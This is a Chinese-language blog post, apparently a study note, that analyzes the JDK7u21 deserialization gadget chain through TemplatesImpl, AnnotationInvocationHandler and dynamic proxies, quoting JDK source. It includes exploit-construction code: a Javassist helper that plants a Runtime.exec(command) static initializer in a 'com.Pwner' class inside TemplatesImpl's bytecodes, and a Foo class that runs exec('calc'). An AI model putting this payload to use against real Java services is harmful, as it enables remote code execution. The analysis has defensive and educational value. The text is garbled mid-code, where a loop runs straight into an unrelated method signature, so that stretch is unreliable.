## **概述**
`JDK7u21` 反序列化漏洞所用到的类都是 `JDK` 自带类,对其做了详细分析，记录一下.
主要涉及类和接口包括：`LinkedHashSet`、`HashSet`、`HashMap`、`TemplatesImpl`、`AbstractTranslet`、`Proxy`、`AnnotationInvocationHandler`.
涉及知识点：Java 反序列化、反射、动态代理.
环境：`jdk1.7.0_21`、`IDEA 2019.2`
## **分析过程**
### **_TemplatesImpl class_**
getTransletInstance() 方法
当 `_class` 字段为 `null` 时，会调用 `defineTransletClasses()` 方法，然后执行
`_class[_transletIndex].newInstance()` 语句( `newInstance()` 会调用
`_class[_transletIndex]` 的无参构造方法，生成类实例对象).
    private Translet getTransletInstance() throws TransformerConfigurationException {
        try {
            if (_name == null) return null;
            if (_class == null) defineTransletClasses();
            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }
            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
defineTransletClasses() 方法分析
    private void defineTransletClasses() throws TransformerConfigurationException {
        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }
        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader());
                }
            });
        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];
            if (classCount > 1) {
                _auxClasses = new Hashtable();
            }
            // 遍历 _bytecodes(byte[][]) 数组，使用类加载器将字节码转化为 Class
            for (int i = 0; i  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory )
        throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        // 新增搜索路径到 pathList 中
        pool.insertClassPath(new ClassClassPath(Foo.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        // 先后从缓存和 pathList 中寻找 Foo 类，返回 CtClass 对象
        final CtClass clazz = pool.get(Foo.class.getName());
        // 构造静态初始化语句，后面用到
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        // 在类中设置静态初始化语句
        clazz.makeClassInitializer().insertBefore(cmd);
        // 设置类名
        clazz.setName("com.Pwner");
        // 先后从缓存和 pathList 中寻找 abstTranslet 类，返回 CtClass 对象
        CtClass superC = pool.get(abstTranslet.getName());
        // 设置父类为 abstTranslet
        clazz.setSuperclass(superC);
        // 将类转换为二进制
        final byte[] classBytes = clazz.toBytecode();
        // 使用 Reflections 反射框架为 _bytecodes 字段赋值
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });
        // 使用 Reflections 反射框架为 _name 字段赋值
        Reflections.setFieldValue(templates, "_name", "Pwner");
        return templates;
        }
        public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }
2、直接构造 `Java` 类，生成 `class` 文件，读取 `class` 文件并转换为字节码数组.
    构造 Java 类
    Foo.java
    import java.lang.Runtime;
    import java.io.Serializable;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    public class Foo extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
        public Foo(){
            try{
                java.lang.Runtime.getRuntime().exec("calc");
            }catch(Exception e){
                System.out.println("exec Exception");
            }
        }
        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }
    读取 class 文件，生成字节码数组
    InputStream in = new FileInputStream("class path");
    byte[] data = toByteArray(in);
    private static byte[] toByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024 * 4];
        int n = 0;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }
将生成的字节码通过 `Reflections` 反射框架为 `_bytecodes` 字段赋值，这时 `TemplatesImpl`
对象就已经构造好了，只需要调用  
`newTransformer()` 或 `getTransletInstance()` 方法即可触发.
### **_AnnotationInvocationHandler class_**
由上面知道，我们需要找到一个序列化类，并且此序列化类能够调用 `TemplatesImpl` 对象的 `newTransformer()` 或
`getTransletInstance()` 方法. `AnnotationInvocationHandler` 类中的 `equalsImpl`
方法正好符合.
`AnnotationInvocationHandler` 类中存在 `var8 = var5.invoke(var1);` 语句(通过反射调用
`var1` 对象的 `var5` 方法),分析一下 `equalsImpl` 方法.
    private Boolean equalsImpl(Object var1) {
        // 判断 var1 和 this 对象是否相等
        if (var1 == this) {
            return true;
        // 判断 var1 对象是否被转化为 this.type 类
        } else if (!this.type.isInstance(var1)) {
            return false;
        } else {
            // 根据 this.type 获取本类的所有方法
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;
            // 遍历从 this.type 类中获取的方法
            for(int var4 = 0; var4 < var3; ++var4) {
                Method var5 = var2[var4];
                String var6 = var5.getName();
                // 查看 this.memberValues 中是否存在 key 为 this.type 类中的方法名
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                // var1 如果为代理类并且为 AnnotationInvocationHandler 类型，返回 Proxy.getInvocationHandler(var1).否则返回 null
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                // var9 不等于 null 时，执行 if 语句，否则执行 else 语句
                if (var9 != null) {
                    var8 = var9.memberValues.get(var6);
                } else {
                    try {
                        // 调用 var1 对象的 var5 方法.  如：getOutputProperties.invoke(templatesImpl)，就会调用 templatesImpl 对象的 getOutputProperties 方法
                        var8 = var5.invoke(var1);
                    } catch (InvocationTargetException var11) {
                        return false;
                    } catch (IllegalAccessException var12) {
                        throw new AssertionError(var12);
                    }
                }
                if (!memberValueEquals(var7, var8)) {
                    return false;
                }
            }
            return true;
        }
    }
所以当我们调用 `equalsImpl` 方法，并且想要成功执行到 `var5.invoke(var1)` 时，需要满足几个条件:
1、var1 ！= this;
2、var1 对象能够转化为 this.type 类型，this.type 应该为 var1 对应类的本类或父类;
3、this.asOneOfUs(var1) 返回 null.
而想要通过反射执行 `TemplatesImpl` 对象的方法， `var1` 应该为 `TemplatesImpl` 对象，`var5` 应该为
`TemplatesImpl` 类中的方法，而 `var5` 方法是从 `this.type` 类中获取到的.通过查看 `TemplatesImpl`
类，`javax.xml.transform.Templates` 接口正好符合，这里最终会调用 `getOutputProperties` 方法.